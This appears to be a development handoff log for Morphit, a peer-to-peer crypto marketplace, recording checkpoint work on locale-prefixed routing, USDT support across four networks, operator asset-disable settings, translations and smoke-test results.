apps/web/src/lib/components/{FaqSearch,AvatarMenu,ChatMessage,FirstPostStarterPack,FirstTradeHelper,LoginQrInitiator,MyBalanceCard,SeedBackupNudge,Term,WelcomeFirstBuyHero}.svelte (20 sites)
apps/web/src/lib/components/LanguageSwitcher.svelte (rewired to goto-via-localePath)

# Audit + smoke coverage
apps/web/scripts/path-adversarial-smoke.ts (NEW — 11 adversarial scenarios)
apps/web/scripts/persona-walkthrough-smoke.ts (+6 CP7 sentinels + docblock)
apps/web/scripts/href-xss-smoke.ts (lp/localePath whitelist + link.href allowlist)
apps/web/scripts/{a11y-patterns,active-owner-key-invariants,fee-status-label-coverage,heading-hierarchy,i18n-raw-exception,identity-label-policy,onboarding-back-button,paired-readonly-affordance-surfaces,price-model-picker-parity,sally-walkthrough,split-on-placeholder,voucher-locale-parity}-smoke.ts (paths updated to [lang]/)
packages/asset-registry/scripts/usdt-network-picker-required-smoke.ts (path updated)
scripts/run-smokes.sh (registered path-adversarial-smoke)

# Docs
docs/REVISIT-LIST.md (cp7 maintained-line + stale Per-locale-prerendering DEFERRED → SHIPPED summary + new DNS-rebinding §A entry)
docs/AUDIT-2026-05.md (Part 121 cp7 entry)
TARBALL.md (this entry)
MORPHIT-BRAG-LIST.md (no-FOUC entry + footer bump)
```

49 files modified (excluding the 24 route-subdir moves which are physical relocations not content edits).

### Pattern lessons from cp7

1. **"Can't run npm run build" was actually a more precise constraint than I'd internalized.** The Vite client bundle DOES build cleanly after cp6's pairingPhoneSigner Buffer fix; only the SvelteKit prerender phase fails, and the failures are EXACTLY what the route restructure addresses (svelte-i18n SSR locale needs initI18nFor before render; handleUnseenRoutes config for dynamic routes).  cp7 attempted the build with that precise understanding and the route restructure unblocked itself.  Lesson: when a doc says "needs a working build," characterize WHICH build phase actually fails and WHY before deferring.
2. **entries() lives on +page.ts not +layout.ts.**  SvelteKit-specific gotcha that the design doc didn't capture.  The error message is explicit ("Invalid export 'entries' in src/routes/[lang]/+layout.ts ('entries' is a valid export in +page.ts, +page.server.ts or +server.ts)") so the fix was 5 minutes once it surfaced.  Documented in [lang]/+layout.ts's docblock + the CP7-2 persona sentinel.
3. **url.search / url.hash forbidden during prerender — use building flag.**  Same class of "can't be known at build time" as SvelteKit's existing forbidden APIs (fetch, navigator, document).  The fix is the same pattern as fetch's `if (browser)` gate: import `building` from `$app/environment`, ternary it.  Once internalized this is mechanical, but it's a real footgun for components that work fine in CSR but fail at prerender time.
4. **Bulk python regex sweep works but has known gaps:** (a) inside `{#each}` blocks iterating over a data array, my regex looked for `href="/orderbook"` literal but the actual template was `href={item.path}` with the literal in the array constructor — fixed by patching the array constructor directly; (b) duplicate-import collision when a target file already imports the same symbol from a different path (FaqSearch had LocaleCode from `$i18n`; my script added it again from `$i18n/locales`) — fixed by deduping after the sweep; (c) comments containing the matched pattern can false-positive sentinels (CP6-7's `mustNotHave: ["$app/environment"]` matched my own module-doc; the lp-href comment in [lang]/+layout.svelte matched href-xss-smoke's pattern).  Future bulk sweeps should run a post-pass to verify no collisions or comment matches.
5. **Refactor pre-existing build-blockers BEFORE attempting the actual restructure.**  pairingPhoneSigner's Buffer fix was cp6 work; without it cp7's build would have failed at the Vite stage and the SvelteKit prerender failures would never have surfaced.  cp6's "ship the helpers + fix the blocker" partial was prerequisite work even though it looked like a smaller scope at the time.  Pattern: the right cp-cycle for a complex feature is N-1 to clear blockers + ship verifiable pieces, then N to do the actual restructure with build verification.

---

## Part 121 cp6 — what's shipped (three-item plow-through)

### Pretext

Ken returned with the three-item agenda queued at the top of cp5's handoff summary.  Earlier mid-cp6 turn rationed work across sessions; Ken pushed back with Memory #16 ("we're not going to a fresh chat session.  i don't care how many turns it takes you to do the job right the first time").  This is the unrationed plow-through to completion.

### Item 1 — USDT drift sweep finishing strokes

`cheat_sheet.description` + `cheat_sheet.section_assets.heading` × 10 locales were still carrying the stale "BTC vs XMR vs BLURT" framing — cp4 had added USDT to the cheat-sheet rows but the descriptive copy still claimed three assets.  FAQ `trade_goods_services` × 10 locales had the same drift in the asset-constraint paragraphs.  Brag-list line 188 still claimed "22 ADRs" — ADR-0023 existed but the count and examples list weren't updated.

Fixed in cp6:

1. `cheat_sheet.description` × 10 locales rewritten to drop the triple-asset framing → "the supported tradable assets at a glance" / native equivalents in each locale (de "Unterstützte handelbare Assets", es "Activos negociables soportados", fa "دارایی‌های قابل معامله پشتیبانی‌شده", zh-CN "支持的可交易资产", etc.).
2. `cheat_sheet.section_assets.heading` × 10 locales rewritten to match.
3. FAQ `trade_goods_services` × 10 locales: en long-form got 3 in-place updates ("BTC, XMR, or BLURT" → "BTC, XMR, BLURT, or USDT" in asset-constraint paragraph, cannot-model paragraph, vice-versa-combinations paragraph) PLUS 2 new bullets in "Common combinations" — "Buy/sell USDT (on Tron, Ethereum, Solana, or BSC) for fiat via Wise or in-person cash" and "Sell USDT for raw garlic (barter, with USD reference price)" (raw garlic per Ken's explicit preference, adds variety alongside the existing orange-tree and cherry-tree barter examples).  9 short-form locales got their summary-sentence update in native phrasing.
4. `MORPHIT-BRAG-LIST.md` line 188 "22 ADRs" → "23 ADRs" with ADR-0023 added to the examples list; line 409 ADR range 0022 → 0023.

### Item 3 — Operator-stance surfacing (MVP scope)

`MORPHIT_INDEXER_DISABLED_ASSETS` was shipped in cp3 + parser tolerance pinned in cp4, but no frontend exposed each instance's actual stance to its own users or to prospective operators on `/run-a-node`.  cp6 shipped the local-instance MVP.

**Indexer + indexer-client:**
- `apps/indexer/src/api/instance.ts` — `InstanceResponse` interface gains `disabled_assets: readonly string[]` (12-line module-doc explaining wire format + surface intent + federation semantics).  Response body wires `disabled_assets: config.disabledAssets`.
- `packages/indexer-client/src/index.ts` — mirrored as optional `readonly disabled_assets?: readonly string[]` for back-compat with pre-cp6 indexers.  Clients default to `[]` when absent.

**Frontend store + pages:**
- `apps/web/src/lib/stores/instance.ts` — `InstanceState` gains `disabled_assets`; FALLBACK = `[]`; hydration `?? []` fallback.
- `apps/web/src/routes/about-this-instance/+page.svelte` — new "This instance's asset policy" section between Instance and Integrity, reads `$instance.disabled_assets`, renders emerald "None" for empty array or operator-disabled tickers list + federation note.
- `apps/web/src/routes/run-a-node/+page.svelte` — new "Your instance, your asset policy" panel between How and Requirements, three pillars (default-on, opt-out env var, federation stays intact), names `MORPHIT_INDEXER_DISABLED_ASSETS` directly.

**i18n parity:**
- 16 new keys × 10 locales = 160 strings native prose: 6 × `about_this_instance.asset_stance.*` + 1 × `section.asset_stance` + 10 × `run_a_node.asset_policy_*`.  en + de hand-edited via `str_replace`; 8 other locales patched via Node scripts writing `JSON.stringify(j, null, 2) + '\n'` (2-space indent matching repo convention, trailing newline, format-verified consistent).

**Federation-probe extension DEFERRED.**  The MVP surfaces THIS instance's stance; surfacing peer-instance stances on `/operators` requires a v33 schema migration (`cached_disabled_assets` column on `known_instances`) plus a probe-handler extension.  REVISIT-LIST §A entry "Federation-probe extension for peer-instance asset stance" lists the full 7 sub-items needed for the v2.

### Item 2 — Per-locale prerendering (honest partial: helpers + smoke + REVISIT)

Per `docs/PER-LOCALE-PRERENDERING-DESIGN.md`'s explicit "must be done on a machine with a working `npm run build`" warning + Memory #11 (verify before claiming) + Memory #17 (wiring discipline), cp6 shipped only the parts verifiable in the sandbox.  Ken approved this Path A scoping after honest pushback (build attempt revealed pre-existing SvelteKit prerender failures unrelated to cp6 work).

**Shipped & smoke-pinned:**

- `apps/web/src/lib/i18n/locales.ts` (NEW, 100 lines) — pure SSoT module with ZERO SvelteKit deps holding `SUPPORTED_LOCALES`, `PLANNED_LOCALES`, `DEFAULT_LOCALE`, `LocaleCode` + `KnownLocaleCode` types, and `matchSupported(tag)`.  Designed to be importable from the prerender-redirect shell.
- `apps/web/src/lib/i18n/path.ts` (NEW, 175 lines) — pure-function helpers: `localePath(path, lang?)` (idempotent link wrapper preserving query+fragment+trailing-slashes; handles language-switcher re-prefixing), `stripLocalePrefix(path)`, `pickLocaleFromAcceptLanguages(prefs)` (no-DOM navigator-style picker), `isLocalePrefixed(path)`.
- `apps/web/src/lib/i18n/index.ts` refactored — pure constants moved to `./locales` and re-exported.  Public API unchanged; existing call sites `import { SUPPORTED_LOCALES } from '$i18n'` continue working.  Duplicate `matchSupported()` body removed.
- `apps/web/scripts/i18n-path-helpers-smoke.ts` (NEW, 22 scenarios) covering localePath idempotency + language-switcher re-prefixing + query/fragment/trailing-slash preservation + non-absolute passthrough + unsupported-lang fallback + root-normalization + zh-Hant/zh-Hans script variants + de-AT/es-MX/fa-IR family fallback + empty/malformed prefs.  Registered in `scripts/run-smokes.sh`.
- `apps/web/scripts/i18n-locale-registry-smoke.ts` updated — parser now reads the new `./locales.ts` SSoT.

**Sibling drifts fixed during the build-attempt phase:**

1. **`apps/web/src/lib/auth/pairingPhoneSigner.ts`** — `import { Buffer } from 'buffer'` was blocking the Vite client bundle build (Buffer doesn't resolve in browser context per Vite's `__vite-browser-external` polyfill).  Pre-existing build blocker unrelated to cp6 but surfaced when cp6 attempted `npm run build`.  Replaced 3 `Buffer.from(uint8Array)` call sites with the codebase-standard `as unknown as Buffer` cast pattern from `$lib/blurt/sign.ts:44`.  After the fix, Vite client bundle ✓ built in 25.20s.
2. **`scripts/build-sitemap.mjs`** ROUTES array was 14 entries while `apps/web/src/lib/seo/routes.ts` INDEXABLE_ROUTES had 17 (`/instances`, `/glossary`, `/cheat-sheet` had been added to SSoT but not mirrored).  Pre-existing drift caught by the existing `assertRoutesInSync()` build-time guard.  Resynced to canonical 17-entry order matching `routes.ts`.  Sitemap.xml regenerates 170 URLs cleanly.

**Still pending (REVISIT-LIST §A captures full sub-items list):**
- Route-tree restructure under `[lang]/` (~70 page + layout files)
- Detection-redirect shell at root `+page.svelte` / `+layout.ts`
- Internal link audit + sweep wrapping every href/goto in `localePath()`
- Sitemap hreflang + RSS per-locale + canonical `<head>` tags
- `LanguagePicker.svelte` update to emit locale-prefixed URLs
- Two pre-existing SvelteKit prerender failures (svelte-i18n SSR locale on `/support`; `handleUnseenRoutes` for 7 dynamic-param routes)

### Persona-walkthrough sentinels added (7 new, all P121-CP6)

- CP6-1 `/v1/instance` surfaces `disabled_assets` in API + indexer-client
- CP6-2 indexer-client `InstanceResponse` mirrors `disabled_assets` (optional)
- CP6-3 frontend instance store hydrates `disabled_assets` with `[]` fallback
- CP6-4 `/about-this-instance` renders asset-stance panel
- CP6-5 `/run-a-node` carries operator-stance explainer with env var named
- CP6-6 per-locale prerendering path helpers shipped in `$i18n/path.ts` with no-`./index`-import invariant
- CP6-7 i18n module split: SUPPORTED_LOCALES SSoT in `$i18n/locales` with no SvelteKit deps

Persona-walkthrough header docblock updated.  42/42 → 49/49.

### Doc + brag-list updates

- `MORPHIT-BRAG-LIST.md` entry #256 (NEW) "Each instance's asset policy is visible up front" describes the `/about-this-instance` panel + federation invariant + default-on-with-env-var pattern.  Footer count 255 → 256, last-updated 2026-05-13 → 2026-05-14.
- `docs/OPERATIONS.md` new subsection "Frontend surfaces showing your instance's disabled-assets list (Part 121 cp6)" between federation-semantics and per-network explorer config.
- `docs/RUN-A-MORPHIT-NODE.md` new paragraph explaining "Your users will see your stance directly" via `/v1/instance` + `/about-this-instance`.
- `docs/PER-LOCALE-PRERENDERING-DESIGN.md` new top-section "Shipping status (Part 121 cp6)" with ✅/⏸ split.
- `docs/REVISIT-LIST.md` two new §A deferral entries (federation-probe extension + per-locale prerendering route restructure) with full sub-items + ✅/⏸ markers per item.

### Verification

- **Triple-pulse `bash scripts/run-smokes.sh`: 2,449 scenarios green × 3, 0 failures.**  cp5 baseline 2,418 → cp6 baseline 2,449 (+31).
- Locale parity: 10/10 green at 2,511 keys × 10 (cp5 was 2,494; +17 = 6 + 1 + 10).
- Translation-completeness: 4/4 green.
- Key-coverage: 1838 static + 24 dynamic resolve.
- Persona-walkthrough: 49/49 green (was 42; +7 P121-CP6).
- svelte-check: 0 errors, 1 pre-existing warning (`FundsSentModal.svelte:83`, unrelated).
- Typecheck sweep: indexer (src + test), relay (src + test), ops-cli, indexer-client, operator-config, asset-registry all 0 errors.
- Vite client bundle build: ✓ built in 25.20s.  SvelteKit prerender phase still fails on pre-existing issues (svelte-i18n SSR on /support; handleUnseenRoutes for 7 dynamic-param routes) — documented in REVISIT-LIST §A; the route-restructure work will address them.
- All cp3/cp4/cp5 invariants preserved: fee-method-enum-frozen 7/7, first-buy-waiver-payment-agnostic 6/6, usdt-trade-only 11/11, usdt-network-picker-required 9/9, disabled-assets-parse 12/12, reserved-keys-parity green.

### Files modified this turn (cp6)

```
apps/web/src/lib/i18n/locales/{en,es,de,pl,fr,it,ru,fa,zh-CN,zh-HK}.json (10)
apps/web/src/lib/i18n/locales.ts (NEW — pure SSoT)
apps/web/src/lib/i18n/path.ts (NEW — pure helpers)
apps/web/src/lib/i18n/index.ts (refactored — re-export from ./locales)
apps/web/src/routes/about-this-instance/+page.svelte
apps/web/src/routes/run-a-node/+page.svelte
apps/web/src/lib/stores/instance.ts
apps/web/src/lib/auth/pairingPhoneSigner.ts (Buffer-import build fix)
apps/web/scripts/persona-walkthrough-smoke.ts (P121-CP6-1..7 sentinels + docblock)
apps/web/scripts/i18n-path-helpers-smoke.ts (NEW)
apps/web/scripts/i18n-locale-registry-smoke.ts (pointed at locales.ts)
apps/indexer/src/api/instance.ts
packages/indexer-client/src/index.ts
scripts/build-sitemap.mjs (ROUTES array re-synced with routes.ts)
scripts/run-smokes.sh (registered i18n-path-helpers-smoke)
MORPHIT-BRAG-LIST.md (entry #256 + ADR-count fixes + footer)
docs/OPERATIONS.md (frontend-surfacing subsection)
docs/RUN-A-MORPHIT-NODE.md (asset-policy frontend visibility note)
docs/PER-LOCALE-PRERENDERING-DESIGN.md (cp6 shipping-status section)
docs/REVISIT-LIST.md (cp6 maintained-line + §A deferral entries)
docs/AUDIT-2026-05.md (Part 121 cp6 entry)
TARBALL.md (this entry)
```

24 files modified.

### Pattern lessons from cp6

1. **Memory #11 + #17 + #18 in concert.**  When the design doc says "needs working `npm run build`" and the sandbox can't run it, pushing back with a scoped honest partial is the right move.  The route-restructure work isn't lost — REVISIT-LIST §A lists the cp6-shipped helpers ✅ so the next session can focus on the SvelteKit-specific parts (entries(), load() shape, prerender invariants).
2. **Pre-existing build blockers surface when you try to build.**  pairingPhoneSigner's Buffer import and build-sitemap's ROUTES drift had been sitting in the repo through cp1-cp5; cp6 only caught them because cp6 tried `npm run build`.  Pattern: build-the-product is the only test that catches build-time issues.
3. **Module-doc literal-substring sentinels need wording discipline.**  CP6-7's `mustNotHave: ["$app/environment", ...]` initially matched the explanatory comments in the module doc, not just the imports.  Reworded comments to use prose paraphrases.
4. **Refactor-then-ship is safer than ship-then-refactor when a smoke needs to run.**  Original Path A had path.ts importing from ./index, which transitively pulled in `$app/environment` and broke the smoke under tsx.  Extracting pure constants into `./locales` first would have been step 1, not step 4.
5. **`/en/` → `/pl` is canonical-normalization not bug.**  Bare `/en` and `/en/` both go to `/pl`; only non-root paths preserve trailing slash.  Updating the test to match intent — and documenting the intent inline — is the right call.

---

## Part 121 cp5 — what shipped previously (cross-session handoff sweep)

### Pretext

Ken declined a full repo-wide deep-deep audit after cp4 (recommendation accepted: scoped USDT audit + persona walks would be higher leverage if revisited later) and asked for a seamless cross-session handoff with every file current.  The sweep grep-driven plus catch-by-smoke.

### Real drift fixed

1. **`apps/web/src/lib/payments/registry.ts`** — registry was missing `pay_usdt` entry.  Real ship gap: without it, users posting non-USDT trades couldn't select USDT as a payment method from the structured picker (only as free-text via `terms`).  Added `pay_usdt` with `assetExclusion: 'USDT'` semantics mirroring BTC/XMR/BLURT.  Comment "BLURT / BTC / XMR are the three assets Morphit supports" → "BLURT / BTC / XMR / USDT are the tradable assets Morphit supports."
2. **`apps/indexer/src/indexer/handlers/operatorPaymentMethod.ts`** — indexer's `RESERVED_CANONICAL_KEYS` set bumped to include `pay_usdt`.  Caught immediately by the existing `reserved-keys-parity-smoke` — exactly the failsafe pattern Memory #14 + WIRE-EVERYTHING discipline is for.
3. **`docs/API.md`** — `asset` query-param description "Filter to `BTC`, `XMR`, or `BLURT`" → includes USDT + new `asset_network` row for multi-network filtering.  `trade_count_by_asset_*` example response shapes extended with USDT counts + a note that the asset list is dynamic.
4. **FAQ `where_to_buy_blurt` × 10 locales** — "BLURT is one of the three assets traded here, alongside BTC and XMR" → "BLURT is one of the four assets traded here, alongside BTC, XMR, and USDT."  All 10 locales got their language-specific replacement.
5. **`apps/web/static/llms-full.txt`** — top-of-file descriptor "fiat↔BTC/XMR/BLURT marketplace" → "fiat↔BTC/XMR/BLURT/USDT marketplace"; the "Yes — Morphit's order model is always a crypto asset (BTC, XMR, or BLURT) on one side" passage at line 106 and the "one side of every Morphit order has to be BTC, XMR, or BLURT" passage at line 116 and the "every combination works as long as the asset is one of BTC/XMR/BLURT" passage at line 128 all updated to include USDT.  Added a fourth "Buy/sell USDT (on Tron/Ethereum/Solana/BSC) for fiat via Wise" example combination.
6. **`apps/web/static/llms.txt`** — top-of-file descriptor updated to match.
7. **`docs/adr/0023-usdt-multi-network.md`** — context-section "Morphit launched with three trade-asset tickers" reframed since Morphit is pre-launch ("Morphit's pre-launch asset registry shipped with three trade-asset tickers").
8. **`docs/GRANDMA-FRIENDLY-INVESTIGATION.md`** — item 1.1 status updated to mention USDT tooltip (with `faqKey="what_is_usdt"` deep-link); item 3.5 (cheat-sheet) status updated to mention the USDT row Part 121 cp4 added.
9. **`apps/web/scripts/persona-walkthrough-smoke.ts`** — D-4 sentinel was matching against PRE-LAUNCH-CHECKLIST's update-history line ("v31") via `mustHave: ['v31']` — false-positive pass because the current schema line in the doc says v32 but the historical line still says v31.  Sentinel bumped to `mustHave: ['currently at v32 as of Part 121']` for a true verification.

### Verification (post-sweep)

- **Triple-pulse `bash scripts/run-smokes.sh`: 2,418 scenarios green × 3, zero failures.**  cp4 baseline 2,418 → cp5 baseline 2,418 (no count change; cp5 fixes are content + 1 wiring fix that the parity smoke caught immediately).
- Locale parity 10/10 green at 2,494 keys × 10
- Translation-completeness: 0 unexpected byte-identical
- All cp3/cp4 invariants preserved (fee-method-enum-frozen, first-buy-waiver-payment-agnostic, usdt-trade-only, usdt-network-picker-required, disabled-assets-parse)
- reserved-keys-parity-smoke: green after indexer + frontend registry sync
- svelte-check: 0 errors

### Pattern lessons from this sweep

1. **The reserved-keys-parity-smoke is the single most valuable smoke in the suite.**  It caught the `pay_usdt` ship gap on the first run after I added the frontend entry.  If I'd merged without re-running smokes, operators wouldn't have been able to receive `pay_usdt` payment-method registrations at the indexer level — silent failure mode.
2. **Static documentation files (llms.txt, llms-full.txt) need the same drift-check discipline as live docs.**  They're served to LLM crawlers and shape how external models describe Morphit; stale claims propagate widely.
3. **Sentinel-grep smokes can false-positive when a doc has both a current and a historical mention of the same string.**  D-4's `mustHave: ['v31']` matched the update-history line.  Sentinels should pin specific phrases ("currently at v32 as of Part 121"), not bare version numbers.
4. **Memory #26 + #27 in action.**  This entire sweep is the discipline both memories prescribe — every coin addition gets a follow-up sweep, and tone-checks across each addition are mandatory.

---

## Part 121 cp4 — what shipped previously

### Pretext

After cp3 sealed Ken asked four follow-up questions in a single message:

1. **Trade-matrix verification** — could a user buy banana trees with USDT, sell XMR for USDT, buy BTC with USDT, sell orange trees for USDT?  All four should work; verify against shipped code.
2. **Word-for-word BRAG-LIST audit** with USDT now present.  Ken specifically caught "Adding a fourth traded asset is a single-package edit" as stale (USDT IS that fourth asset).  Sweep for similar.
3. **New arbitrage FAQ + brag-list entry** emphasizing Morphit's low-friction P2P fees making CEX/DEX arbitrage viable as Morphit liquidity grows.
4. **Multi-coin disable** — how does `MORPHIT_INDEXER_DISABLED_ASSETS` work when an operator wants to disable 2 or 3 coins, not just one?

Plus a standing-discipline request: marketing copy about any listed asset must be RESPECTFUL to that asset's community.  No "fails priorities" framing.

### Memory edits committed (2 new)

- **#26** Audit BRAG-LIST + every FAQ entry + ADRs + docs for stale claims when adding a new asset.  The new asset IS the change; future-tense claims about it must move to present-tense same turn.
- **#27** Marketing copy about any listed asset must be RESPECTFUL to that coin's community.  No "fails priorities" / "doesn't meet standards" framings.  State trade-offs factually.  Every coin community is a potential Morphit user base.

### cp4 work shipped (kept for cross-session handoff context)

(See previous TARBALL entries for full detail.  cp4 covered: trade-matrix verification across both patterns — USDT as trade asset and USDT as payment method; 7 BRAG-LIST stale claims fixed; new entry #255 (arbitrage between Morphit and CEX/DEX); tone-pass across 4 USDT surfaces ×10 locales; new FAQ `arbitrage_morphit_vs_exchanges` × 10 locales; multi-coin disable verified with 12-scenario `disabled-assets-parse-smoke`; cheat-sheet USDT row added.  Verification: 2,418 scenarios green × 3, locale parity 10/10 green at 2,494 keys × 10, all cp3 invariants preserved.)

---

## Part 121 cp3 — what shipped previously

### Pretext

After cp3 sealed Ken asked four follow-up questions in a single message:

1. **Trade-matrix verification** — could a user buy banana trees with USDT, sell XMR for USDT, buy BTC with USDT, sell orange trees for USDT?  All four should work; verify against shipped code.
2. **Word-for-word BRAG-LIST audit** with USDT now present.  Ken specifically caught "Adding a fourth traded asset is a single-package edit" as stale (USDT IS that fourth asset).  Sweep for similar.
3. **New arbitrage FAQ + brag-list entry** emphasizing Morphit's low-friction P2P fees making CEX/DEX arbitrage viable as Morphit liquidity grows.
4. **Multi-coin disable** — how does `MORPHIT_INDEXER_DISABLED_ASSETS` work when an operator wants to disable 2 or 3 coins, not just one?

Plus a standing-discipline request: marketing copy about any listed asset must be RESPECTFUL to that asset's community.  No "fails priorities" framing.

### Memory edits committed (2 new)

- **#26** Audit BRAG-LIST + every FAQ entry + ADRs + docs for stale claims when adding a new asset.  The new asset IS the change; future-tense claims about it must move to present-tense same turn.
- **#27** Marketing copy about any listed asset must be RESPECTFUL to that coin's community.  No "fails priorities" / "doesn't meet standards" framings.  State trade-offs factually.  Every coin community is a potential Morphit user base.

### Trade-matrix verification

All four scenarios work end-to-end, verified against shipped code paths.  Two distinct patterns:

- **USDT as the trade asset** (asset=USDT) → network pinned at post-time via `orders.asset_network` column.  Orderbook row shows "USDT on Tron" chip.  Examples: "buy banana trees with USDT" (side=sell, asset=USDT, payment_methods=["Banana trees"]), "sell orange trees for USDT" (side=buy, asset=USDT, payment_methods=["Orange trees"]).
- **USDT as a payment method** (asset=BTC/XMR/etc., payment_methods includes "USDT") → network pinned at chat-time via AddressShareModal/FundsSentModal USDT tab.  Examples: "sell XMR for USDT" (side=sell, asset=XMR, payment_methods=["USDT-TRC20"]), "buy BTC with USDT" (side=buy, asset=BTC, payment_methods=["USDT"]).

`payment_methods[]` accepts 1-12 items of 1-32 chars each.  Free-text labels like "Banana trees", "USDT-TRC20", "Cash in person", "Wise EUR" all work.

### BRAG-LIST audit — 7 stale claims fixed

- **#166** "(+ others soon)" → "BTC, XMR, BLURT, and USDT (across four networks)"
- **#195** "Volume by asset (BTC / XMR / BLURT)" → explicit USDT + "any other asset traded on the instance"
- **#197** USDT added to QR-share supported-assets list
- **#200** USDT example added to barter list ("USDT for fresh-pressed olive oil")
- **#209** (the headline catch) "Adding a fourth traded asset is a single-package edit" → reframed per Ken's suggestion to "Adding new tradable assets is usually a single day's work, not a year-long refactor"
- **#233** cheat-sheet asset list reframed from "BTC vs XMR vs BLURT" → "supported tradable assets at a glance"
- **#253** (just-shipped cp3 entry) "philosophical objections to USDT" softened; acknowledges USDT's value upfront

### New entry #255

Arbitrage between Morphit and CEX/DEX is built for, not built against — fraction-of-a-dollar listing fees, no taker fee, no per-trade withdrawal fee, no withdrawal cooldown, price-model picker's spread-vs-CoinGecko-mid for hands-off arbitrage, network effect benefits as liquidity grows.

Footer count 254 → 255.

### Tone-pass across USDT copy (Memory #27)

Four surfaces softened:

- **Privacy chip body** (`assets.privacy_warnings.usdt_centralized`) × 10 locales: now opens "Two things to know about USDT before trading:" and closes "Pick the asset that fits your trade"
- **FAQ entry `why_usdt_warning`** × 10 locales: opens "USDT is the most-traded stablecoin in the world", states the two technical facts (Tether administration, on-chain visibility) factually, closes with neutral per-use-case guidance
- **ADR-0023 §6** renamed "Privacy warning chip required" → "Information chip"; "USDT fails on two dimensions" → "Two facts are worth surfacing"; documents `PrivacyWarningChip` component name as historical shorthand
- **ADR-0023 negative/accepted costs** — "USDT users see the privacy-warning chip — friction by design" → "USDT traders see the information chip — a small friction in service of an informed-choice user model"

### New FAQ: arbitrage_morphit_vs_exchanges × 10 locales

Wired into FAQ_KEYS + FAQ_RELATED (cross-linked from fees, trade_size_limits, how_to_buy, how_to_sell).  Body covers thin listing fees + no taker fee + price-model picker + Sybil-tier-is-anti-spam-not-anti-arbitrage.

### Multi-coin disable verified + locked

The zod parser in `apps/indexer/src/config/index.ts:434` was already multi-coin capable (split+trim+upper+filter-empty).  Gap was docs + test coverage.

- **NEW smoke** `apps/indexer/scripts/disabled-assets-parse-smoke.ts` (12 scenarios green): empty/one/two/three coins + whitespace + case + trailing/leading/double commas.  Registered in `scripts/run-smokes.sh`.
- **OPERATIONS.md** expanded with explicit multi-coin examples + whitespace-tolerance + pointer to parse smoke.  Tone softened on "users who object on philosophical grounds" → "Users who prefer an instance that supports the asset switch to a different Morphit operator — federation is the point."

### Cheat-sheet

USDT row added to `/cheat-sheet` page; `cheat_sheet.section_assets.usdt` translated to all 10 locales.  Source comment updated from "BTC vs XMR vs BLURT" to "the supported tradable assets at a glance" so future additions don't drift the doc.

### Verification

- **Triple-pulse `bash scripts/run-smokes.sh`: 2,418 scenarios green × 3, zero failures.**  cp3 baseline 2,405 → cp4 baseline 2,418 (+13).
- Locale parity 10/10 green at 2,494 keys × 10
- Translation-completeness: 0 unexpected byte-identical
- usdt-trade-only 11/11
- usdt-network-picker-required 9/9
- disabled-assets-parse 12/12
- fee-method-enum-frozen 7/7 (Memory #23 preserved through cp3 + cp4)
- first-buy-waiver-payment-agnostic 6/6
- svelte-check 0 errors

### Pattern lessons distilled

1. Asset-addition audit is recurring discipline, not one-shot.  cp3 shipped USDT in 56 files; cp4 had to touch 7 more brag-list entries + 4 i18n surfaces + cheat-sheet + ADR for tone.
2. Marketing copy is its own architecture — "fails priorities" alienates each asset's community.  Coin communities are potential Morphit user bases; disrespect costs.
3. Test multi-coin shapes when documenting them — the parser was correct from day one but docs only showed single-coin examples; the smoke now pins all shapes operators might write.
4. Component names can lie even when i18n bodies are correct — `PrivacyWarningChip` is fine as internal shorthand but the public-facing copy is neutral; ADR now documents this split.

---

## Part 121 cp3 — what shipped previously

### Pretext

Ken's directive after cp2 sealed: *"let's add Tether (USDT). do not let people pay fees with it. i will never own usdt and do not want any from anyone/anywhere. it's not private at all and is very centralised, but i am choosing to add it because active traders choose to hold/use it for holding value temporarily."*

Pre-execution design Q&A turn detailed how USDT would appear in Morphit, then asked 5 edge-case design questions.  Ken's answers (committed before code landed):

1. **9a — wrong-network address in chat:** same posture as BTC/XMR (reject inline)
2. **9b — order-row hint:** "you need USDT on Tron for this trade" chip
3. **9c — operator opt-in posture:** default=ON instance-wide with operator-config override (same for all future coin additions).  **Memory #25 committed.**
4. **9d — bridged vs native:** native only
5. **9e — depeg risk:** live "1 USDT = $X.XX live" subline on every USDT row

### Memory edit #25

> Every new tradable asset ships default=ON instance-wide, with operator-config override to disable.  Pattern: `MORPHIT_INDEXER_DISABLED_ASSETS` env var.  Per-asset opt-out is OPERATOR-level not user-level.  Applies to USDT and all future coin additions.

### Code changes shipped

**Foundation:**
- Canonical asset registry: USDT entry with `canPayListingFee: false`, 4 supported networks, `defaultNetwork: null`, `privacyWarningKey: 'usdt_centralized'`
- NEW `apps/web/src/lib/assets/networks.ts` — per-network metadata module (regexes + bundled explorers: etherscan.io, tronscan.org, solscan.io, bscscan.com per Ken's list; Omni Layer excluded per Tether's own deprecation)
- Frontend asset registry mirrors canonical with `canBeUsedForListingFee: false`

**Chat payload:**
- `ChatAssetTicker` extended to include `'usdt'`
- `AddressPayload`/`FundsSentPayload` gained optional `network` field
- `isValidAddress`/`isValidTxid` dispatchers extended for USDT

**Indexer:**
- New `MORPHIT_INDEXER_DISABLED_ASSETS` env var + `Config.disabledAssets` field
- Order handler instance-wide disable gate (`asset_disabled_on_instance`)
- `validate()` asset_network gates: `asset_network_required_for_usdt` / `asset_network_unknown` / `asset_network_not_permitted_for_asset`
- All 4 INSERT INTO orders sites rewritten with `asset_network` column
- Schema v32 migration: `orders.asset_network TEXT` + partial index, idempotent

**Indexer-client + API:**
- `OrderRecord.asset_network?: string | null` type
- Orderbook SELECT + rowToWire include asset_network

**Order payload builder:**
- `OrderFormInput.assetNetwork` + `OrderPayload.asset_network` fields

**Instance store:**
- `chat_link_urls.usdt` sub-map for per-network operator-overridable explorer templates

**Explorer URLs:**
- `usdtExplorerUrl(network, txid)` — reads instance override, falls back to bundled default, SPL preserves case

**Price feed:**
- USDT added to fallback ($1.00 static) + Coingecko ('tether' ID for live peg state)

**3 new Svelte components:**
- `PrivacyWarningChip.svelte` (full + compact variants, dismissible per-session)
- `UsdtNetworkPicker.svelte` (required radio, cross-network warning above)
- `UsdtPriceSubline.svelte` (live + stale fallback)

**3 form integrations:**
- `/post +page.svelte` (chip + picker, step1Done gated)
- `AddressShareModal.svelte` (USDT tab, per-network validation, picker, payload threads network)
- `FundsSentModal.svelte` (USDT tab, `initialUsdtNetwork` prop with networkPinned read-only mode)

**ChatMessage rendering:**
- `explorerLinkForTxid` takes optional network
- Address pill: bold-network prefix chip + amber per-message warning (stays on chat record forever)
- Funds-sent pill: same prefix

**Orderbook row:**
- USDT network chip with title-tooltip hint (9b)
- `<UsdtPriceSubline compact />` (9e)

**SVG assets:**
- `/icons/icon-usdt.svg` (Tether teal) + 4 sub-network chip icons at `/icons/networks/`

